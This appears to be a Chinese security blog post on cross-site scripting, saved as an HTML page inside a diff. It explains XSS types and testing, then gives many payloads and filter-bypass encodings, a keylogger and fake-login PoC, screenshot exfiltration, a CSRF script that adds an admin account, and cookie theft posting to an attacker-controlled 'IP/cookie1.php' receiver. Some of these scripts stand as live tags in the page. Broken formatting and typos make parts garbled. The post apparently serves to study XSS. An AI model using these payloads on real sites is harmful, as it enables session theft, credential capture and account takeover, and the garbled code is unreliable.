@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>XSS | Mkey的博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="XSS跨站攻击，即Cross Site Script Execution(xss)，属于前端漏洞，是产生在浏览器一端的漏洞。XSS通过攻击者在网页中嵌入客户端脚本，实现攻击。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS">
+<meta property="og:url" content="https://monkeyh0ck.github.io/2021/12/01/XSS/index.html">
+<meta property="og:site_name" content="Mkey的博客">
+<meta property="og:description" content="XSS跨站攻击，即Cross Site Script Execution(xss)，属于前端漏洞，是产生在浏览器一端的漏洞。XSS通过攻击者在网页中嵌入客户端脚本，实现攻击。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-11-30T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-03-26T13:33:11.972Z">
+<meta property="article:author" content="HOU">
+<meta property="article:tag" content="web-security">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Mkey的博客" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Mkey的博客</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://monkeyh0ck.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-XSS" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/12/01/XSS/" class="article-date">
+  <time class="dt-published" datetime="2021-11-30T16:00:00.000Z" itemprop="datePublished">2021-12-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      XSS
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>跨站攻击，即Cross Site Script Execution(xss)，属于前端漏洞，是产生在浏览器一端的漏洞。<br>XSS通过攻击者在网页中嵌入客户端脚本，实现攻击。</p>
+<span id="more"></span>
+
+<p><strong>XSS危害</strong></p>
+<ul>
+<li>盗取cookie</li>
+<li>js实现钓鱼攻击</li>
+<li>流量指向</li>
+<li>配合CSRF攻击</li>
+</ul>
+<p><strong>XSS分类</strong></p>
+<ul>
+<li>反射型XSS</li>
+<li>存储型XSS</li>
+<li>DOM型XSS</li>
+</ul>
+<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>将恶意脚本永久存储在web应用程序的服务器中，每当浏览相关内容，就会触发恶意代码。<br>常见的例子是:评论选项</p>
+<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>攻击者将恶意代码注入到单个HTML响应中，未将恶意脚本存储在web服务器数据库中。<br>攻击者需要使用网络钓鱼发送恶意连接来诱骗用户。</p>
+<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>基于DOM的跨站脚本是出现在文档对象模型而不是HTML页面中的漏洞</p>
+<p><strong>DOM&#x2F;文档对象模型</strong><br>DOM描述了不同网页片段，如：标题、表格、表单、HTML页面的层次结构等。<br>通过DOM，js获得了创建动态HTML所需的所有功能<br>基于 DOM 的 XSS 漏洞通常出现在 JavaScript 从攻击者可控制的来源（例如 URL）获取数据并将其传递给支持动态代码执行的接收器（危险的 JavaScript 函数或 DOM 对象 eval()）时。<br>基于DOM的XSS在本地计算机上利用漏洞如下：</p>
+<ul>
+<li>攻击者创建恶意网站</li>
+<li>用户打开它</li>
+<li>他的电脑上有一个易受攻击的页面</li>
+<li>攻击者的站点向易受攻击的 HTML 页面发送命令</li>
+<li>易受攻击的本地页面在这台机器上使用用户权限运行这些命令</li>
+<li>攻击者获得对受害者计算机的控制权</li>
+</ul>
+<h4 id="DOM攻击方式"><a href="#DOM攻击方式" class="headerlink" title="DOM攻击方式"></a>DOM攻击方式</h4><ol>
+<li>使用<code>document.write</code>直接输出数据<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">document.write(&#x27;url: &lt;a href=&quot;&#x27;+url+&#x27;&quot;&gt;&quot;&#x27;+url+&#x27;&quot;&lt;/a&gt;&#x27;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
+<li>使用<code>innerHTML</code>直接输出数据<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(&quot;test&quot;).innerHTML = &#x27;我的url是: &lt;a href=&quot;&#x27; + url + &#x27;&quot;&gt;&quot;&#x27; + url + &#x27;&quot;&lt;/a&gt;&#x27;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
+<li>使用<code>lovation</code>、<code>location.herf</code>、<code>location.replace</code>、<code>iframe.src</code>、<code>document.referer</code>、<code>window.name</code>等<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">location.href = url;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="XSS测试"><a href="#XSS测试" class="headerlink" title="XSS测试"></a>XSS测试</h3><h4 id="手动测试XSS"><a href="#手动测试XSS" class="headerlink" title="手动测试XSS"></a>手动测试XSS</h4><ul>
+<li><p>可得知输出位置</p>
+<ul>
+<li>输入敏感字符<code>&lt;、&gt;、&quot;、&#39;、()</code></li>
+<li>查看HTML源码，看是否被转义</li>
+<li>由于程序可能过滤，不好找，可以输入：<code>AAA&lt;&gt;&quot;&quot;</code>,方便查找</li>
+</ul>
+</li>
+<li><p>无法得知输出位置</p>
+<ul>
+<li>通常采用的payload是：<code>&quot;/&gt;XSS Test</code></li>
+<li>可能的情况是留言板下顺畅管理员审核才可见。</li>
+</ul>
+</li>
+<li><p>无回显情况下的测试方法	</p>
+<p>  -通过对返回页面进行解析，结合语义分析，根据输出在不同的上下文来选择发送我们的payload</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var param = location.hash.split(&quot;#&quot;)[1];</span><br><span class="line">document.write(&quot;Hello &quot; + param + &quot;!&quot;);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>由<code>document.write</code>定位到<code>param</code>再找到<code>location.hash.split(&quot;#&quot;)[1]</code></li>
+<li>在污点分析模型里面，我们称document.write为sink，也就是污点汇聚点,代表直接产生安全敏感操作(违反数据完整性)或者泄露隐私数据到外界(违反数据保密性)，称location.hash.split(“#”)[1]为source，也就是污点源,代表直接引入不受信任的数据或者机密数据到系统中。很多代码审计工具也是基于了这样的模型。</li>
+</ul>
+</li>
+</ul>
+<h4 id="自动测试XSS"><a href="#自动测试XSS" class="headerlink" title="自动测试XSS"></a>自动测试XSS</h4><p>可使用工具:AWVS、APPSCAN、XSSER、XSSF<br>扫描器检测流程</p>
+<ol>
+<li>发送随机字符</li>
+<li>确认参数回显</li>
+<li>通过html&#x2F;js解析确认回显位置</li>
+<li>根据回显的上下文发送不同的payload进行测试</li>
+<li>使用html，js语法树解析是否多出来标签，属性，js语句等来确定是否执行成功</li>
+</ol>
+<h4 id="其他测试工具"><a href="#其他测试工具" class="headerlink" title="其他测试工具"></a>其他测试工具</h4><ul>
+<li>X-Forwarded-For Header<ul>
+<li>PHP可以通过<code>X_FORWARDED_FOR</code>函数获取客户端的IP，X-Forwarded-For Header可以对<code>X_FORWARDED_FOR</code>进行修改，实现伪造IP</li>
+<li>PHP获取IP有3个函数，<code>X_FORWARDED_FOR</code>函数存在漏洞，其他两个函数没有漏洞</li>
+</ul>
+</li>
+<li>Modufy Headers<ul>
+<li>伪造<code>HTTP_CLIENT_IP</code>来更改IP</li>
+<li>上面的两个都是通过伪造IP来实现XSS注入，PHP的最后一种获取IP地址的方法是<code>REMOTE_ADDR。REMOTE_ADDR</code>是由nginx传递给php无法插手，没法实现修改与注入</li>
+</ul>
+</li>
+</ul>
+<h3 id="XSS的payload"><a href="#XSS的payload" class="headerlink" title="XSS的payload"></a>XSS的payload</h3><h4 id="script"><a href="#script" class="headerlink" title="script"></a>script</h4><p>使用script标签是最常用的XSS方法，但是大多情况下也不禁止插入script标签。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获取cookie</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="事件处理器"><a href="#事件处理器" class="headerlink" title="事件处理器"></a>事件处理器</h4><p>注入需要使用script标签实现XSS，但是script标签被过滤了，要调用js，可以通过元素类型上使用事件处理器。方法有</p>
+<ul>
+<li><p>herf</p>
+<ul>
+<li><code>&lt;a herf=javascript:alert(/xss/)&gt;xss&lt;/a&gt;</code></li>
+</ul>
+</li>
+<li><p>img</p>
+<pre><code> - `&lt;img src=x onerror=alert(&#39;XSS&#39;)/&gt;`
+</code></pre>
+<ul>
+<li>img标签也因为经常被用来攻击，也被加入XSS过滤黑名单</li>
+</ul>
+</li>
+<li><p>body</p>
+<pre><code> - `&lt;body onpageshow=alert(1)&gt;`
+ - 通过onpageshow事件提交body元素
+</code></pre>
+</li>
+<li><p>style</p>
+<ul>
+<li><code>&lt;style onlead=alert(1)/&gt;</code></li>
+<li>onload事件总会被识别未危险动作</li>
+</ul>
+</li>
+<li><p>marquee</p>
+<ul>
+<li>Marquee 标签除了在web开发中有标签内容回滚作用之外，它还支持一系列的事件处理程序，因此可以用它来实现XSS Payload触发。</li>
+</ul>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;marquee behavior=&quot;alternate&quot; onstart=alert(1)&gt;hack the planet&lt;/marquee&gt;</span><br><span class="line"></span><br><span class="line">&lt;marquee loop=&quot;1&quot; onfinish=alert(1)&gt;hack the planet&lt;/marquee&gt;</span><br><span class="line"></span><br><span class="line">&lt;marquee onstart=alert(1)&gt;hack the planet&lt;/marquee&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>media</p>
+<ul>
+<li>利用音视频标签来加载XSS Payload的方法很少见，实际来说，音视频标签中确实有几种事件处理程序不会轻易被列入黑名单行列</li>
+</ul>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">oncanplay: 在用户可以开始播放音视频（audio/video）时触发；</span><br><span class="line">	</span><br><span class="line">ondurationchange: 在音视频（audio/video）的时长发生变化时触发；</span><br><span class="line">	</span><br><span class="line">onended: 在音视频（audio/video）播放结束时触发；</span><br><span class="line">	</span><br><span class="line">onloadeddata: 在音视频数据帧加载时触发，也即在当前帧的数据加载完成且还没有足够的数据播放音视频（audio/video）的下一帧时触发；</span><br><span class="line">	</span><br><span class="line">onloadedmetadata: 在指定音视频（audio/video）的元数据（如分辨率和时长）加载后触发；</span><br><span class="line">	</span><br><span class="line">onloadstart: 在浏览器开始寻找指定音视频（audio/video）时触发；</span><br><span class="line">	</span><br><span class="line">onprogress: 浏览器下载指定的音视频（audio/video）时触发；</span><br><span class="line">	</span><br><span class="line">onsuspend: 在浏览器读取音视频（audio/video）数据中止时触发。</span><br></pre></td></tr></table></figure>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio oncanplay=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;audio ondurationchange=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;audio autoplay=true onended=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;audio onloadeddata=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;audio onloadedmetadata=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;audio onloadstart=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;audio onprogress=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;audio onsuspend=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;video oncanplay=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;video ondurationchange=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;video autoplay=true onended=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;video onloadeddata=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;video onloadedmetadata=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;video onloadstart=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;video onprogress=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;video onsuspend=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_50464560/article/details/114491500">XSS过滤绕过速查表</a></p>
+<h3 id="绕过黑名单匹配规则"><a href="#绕过黑名单匹配规则" class="headerlink" title="绕过黑名单匹配规则"></a>绕过黑名单匹配规则</h3><h4 id="javascript写法绕过"><a href="#javascript写法绕过" class="headerlink" title="javascript写法绕过"></a>javascript写法绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">大小写混淆:</span><br><span class="line">&lt;img src=JaVaScRiPt:alert(&#x27;xss&#x27;)&gt;</span><br><span class="line">插入[tab]键；</span><br><span class="line">&lt;img src=&quot;jav	ascript:alert(&quot;xss&quot;);&quot;&gt;</span><br><span class="line">插入回车符：</span><br><span class="line">&lt;img src=&quot;jav</span><br><span class="line">asrci</span><br><span class="line">pt:alert( xss&#x27;);”&gt;</span><br><span class="line">使用/**/注释符：</span><br><span class="line">&lt;img src=&quot;java/*xxx*/script:alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">重复混淆关键字:</span><br><span class="line">&lt;img src=&quot;java/*/*javascript*/script/*javascript*/*/script:alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">使用&amp;#十六进制编码字符：</span><br><span class="line">&lt;img src=&quot;jav&amp;#x09;ascript:alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">使用&amp;#十进制编码字符：</span><br><span class="line">&lt;img src= jav&amp;#97;script:alent( xss&#x27;);&quot;&gt;</span><br><span class="line">使用&amp;#十进制编码字符(加入大量的0000):</span><br><span class="line">&lt;img src=&quot;j&amp;#00097;vascript:alert( *xss’);</span><br><span class="line">在开头插入空格：</span><br><span class="line">&lt;img src=&quot;javascript:alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="eval-和其他冗余符号"><a href="#eval-和其他冗余符号" class="headerlink" title="eval 和其他冗余符号"></a>eval 和其他冗余符号</h4><p>如果目标系统的WAF或其它防护软件没把 &#x2F;(eval|replace)(.+?)&#x2F;i 这种样式列入黑名单</p>
+<p><code>eval(&#39;alert(1)&#39;)</code>等价于<code>alert(1)</code></p>
+<p>使用evaluate和replace事件绕过WAF规则</p>
+<ul>
+<li><code>eval(&#39;~a~le~re~~(~~1~~)~&#39;.replace(/~/g.&#39;&#39;))</code></li>
+<li>引号被转义<ul>
+<li><code>eval(\&#39;~a~le~rt~~(~~1~~)~\&#39;.replace(/~/g, \&#39;\&#39;))</code></li>
+</ul>
+</li>
+<li>避免带入引号<ul>
+<li><code>eval(/~a~le~rt~~(~~1~~)~/.source.replace(/~/g, new String()))</code></li>
+</ul>
+</li>
+<li>使用eval的String.fromCharCode方法，将unicode传唤成ASCII字符，形成字符串<ul>
+<li><code>console.log(String.fromCharCode(65,66,67,68)) //在终端返回显示的是字符串 &quot;ABCD&quot;</code></li>
+<li><code>eval(String.fromCharCode(97,108,101,114,116,40,49,41)) //// 最终执行的会是 alert(1)</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="Eval"><a href="#Eval" class="headerlink" title="Eval"></a>Eval</h4><p>eval是一个危险方法，有的防火墙会对eval实现过滤如：<code>/eval(.+?)/i</code></p>
+<ul>
+<li><p><code>var x = eval;x(&#39;alert(1)&#39;)</code></p>
+</li>
+<li><pre><code>(eval)    // 返回函数eval 
+(1, eval) // 仍然返回函数eval
+(1, eval)(&#39;alert(1)&#39;)  // 返回 alert(1)
+
+使用call方法直接调用
+eval.call(null, &#39;alert(1)&#39;)  //返回 alert(1)
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 使用方法来调用alert</span><br><span class="line"></span><br><span class="line">  - `new Function(&#x27;alert(1)&#x27;)()`</span><br><span class="line"></span><br><span class="line">#### 利用错误输入过滤机制实现绕过</span><br><span class="line"></span><br><span class="line">- 不安全样式删除机制</span><br><span class="line">  - `&lt;sc&lt;script&gt;ript&gt;alert(1)&lt;/sc&lt;/script&gt;ript&gt;`</span><br><span class="line">- 替换不安全样式</span><br><span class="line">  - `&lt;script NAUGHTY_HACKER&gt;alert(1)&lt;/script NAUGHTY_HACKER&gt;`</span><br><span class="line">- 当一些不安全的样式被替换而不是被删除之后，目标系统过滤器要识别它们，可能就有一些麻烦了。根据不同的过滤器规则，可以使用替换方式来构造我们最终想要的Payload。</span><br><span class="line">  - 就比如，如果目标系统的过滤器会把`&lt;script&gt;&lt;/script&gt;;`标签对都过滤替换为NAUGHTY_HACKER字段，那么，我们提交`&lt;script&gt;alert(1)&lt;/script&gt;` 之后的结果就会是`NAUGHTY_HACKERalert(1)NAUGHTY_HACKER`。</span><br><span class="line"></span><br><span class="line">### XSS其他危害</span><br><span class="line"></span><br><span class="line">#### 无需会话cookie劫持用户</span><br><span class="line"></span><br><span class="line">HttpOnly使js难以获取cookie</span><br><span class="line"></span><br><span class="line">可以通过`keypress`事件返回用户的按键信息。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+<p>document.addEventListener(‘keypress’, function (event) {<br>  var xhr &#x3D; new XMLHttpRequest()<br>  xhr.open(‘POST’, ‘&#x2F;keylogger’)<br>  xhr.setRequestHeader(‘Content-Type’, ‘application&#x2F;x-www-form-urlencoded’)<br>  xhr.send(‘data&#x3D;’ + event.key)<br>})</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### 修改DOM</span><br><span class="line"></span><br><span class="line">我们可以对上述键盘记录器PoC稍作修改，可以修改执行时的DOM，用包含登录页面的body内容进行替换。这样一来，可以把任意标记内容都分配给document.body.innerHTML作为属性，如下：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>var dummyFormHtml &#x3D; ‘We&#39;ve had reports of bad guys trying to do wrong by ‘ +<br>                    ‘our users lately - help us, help you, by logging in ‘ +<br>                    ‘again to confirm your identity<br><input type="text">‘ +<br>                    ‘<br><input type="password"><br><input type="submit" value="Login">‘</p>
+<p>document.body.innerHTML &#x3D; dummyFormHtml</p>
+<p>document.addEventListener(‘keypress’, function (event) {<br>  var xhr &#x3D; new XMLHttpRequest()<br>  xhr.open(‘POST’, ‘&#x2F;keylogger’)<br>  xhr.setRequestHeader(‘Content-Type’, ‘application&#x2F;x-www-form-urlencoded’)<br>  xhr.send(‘data&#x3D;’ + event.key)<br>})</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 利用XSS获取浏览器截图</span><br><span class="line"></span><br><span class="line">html2canvas 能够实现在用户浏览器端直接对整个或部分页面进行截屏，利用这一功能，攻击者用6行JavaScript代码就能窃取受害者浏览器视图截图，并回传到控制服务器。代码示例如下：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>html2canvas(document.querySelector(“body”)).then(canvas &#x3D;&gt; {<br>  var xhr &#x3D; new XMLHttpRequest()<br>  xhr.open(‘POST’, ‘&#x2F;screenshot’)<br>  xhr.setRequestHeader(‘Content-Type’, ‘application&#x2F;x-www-form-urlencoded’)<br>  xhr.send(‘data&#x3D;’ + encodeURIComponent(canvas.toDataURL()))<br>});</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### XSS+CSRF</span><br><span class="line">---</span><br><span class="line">通过注册新用户或者暴力破解等方式登入网站后台，权限不为admin，用于审计网站后台结构。将script代码在留言板发送给管理员，管理员查看留言板之后服务器会跳转界面执行指令</span><br><span class="line"></span><br><span class="line">**注入代码**</span><br></pre></td></tr></table></figure>
+<script>function loadXMLDoc()
+{
+var xmlhttp=new XMLHttpRequest();
+
+xmlhttp.open("POST","http://10.10.10.135:81/510cms/admin/adminadd.php?admin=add",true);
+xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+xmlhttp.send("name=su&passwd=12345&remark= test&mid=2&adminsubmit=%CC%E1%BD%BB");
+}
+loadXMLDoc();
+</script>
+<p>xmlhttp.open(打开管理后台增加管理员的url)<br>xmlhttp.send(然后传递value参数进去，增加passwd和name的值)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">在一个文章管理系统的留言板，存在存储型XSS注入漏洞，当管理员打开留言板信息查看的时候，触发其中的XSS代码，攻击者获取管理员cookie信息，可以用来做固定session会话攻击登陆后台。</span><br><span class="line"></span><br><span class="line">文件管理系统的留言板下输入script的代码信息，当管理员查看留言板信息的时候将造成cookie的获取</span><br><span class="line">**注入代码**</span><br></pre></td></tr></table></figure>
+<script>
+var url = 'http://IP/cookie1.php'
+var data = 'cookie='+document.cookie;
+var nxhr = new XMLHttpRequest();
+nxhr.open("POST",url);
+nxhr.setRequestHeader('content-type','application/x-www-form-urlencoded');
+nxhr.send(data);
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**接收代码**</span><br></pre></td></tr></table></figure>
+<?php
+$cookie = $_POST['cookie'];
+?>
+```
+
+
+
+>参考文献：
+>
+>[他山之石 | 对 XSS 的一次深入分析认识 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/195507.html)
+>[浅谈XSS](https://www.freebuf.com/articles/web/276998.html)
+>[XSS过滤绕过速查表](https://blog.csdn.net/weixin_50464560/article/details/114491500)
+>[XSS注入攻击——web漏洞利用](https://www.freebuf.com/vuls/280992.html)
+</script>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://monkeyh0ck.github.io/2021/12/01/XSS/" data-id="clfpg8ztn000fvwv5hf6s0tov" data-title="XSS" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/01/01/%E6%9E%81%E9%AA%8C%E6%BB%91%E5%9D%971/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          极验滑块
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/12/01/networkSecurity/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">网络安全训练营</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/web-security/" style="font-size: 10px;">web-security</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
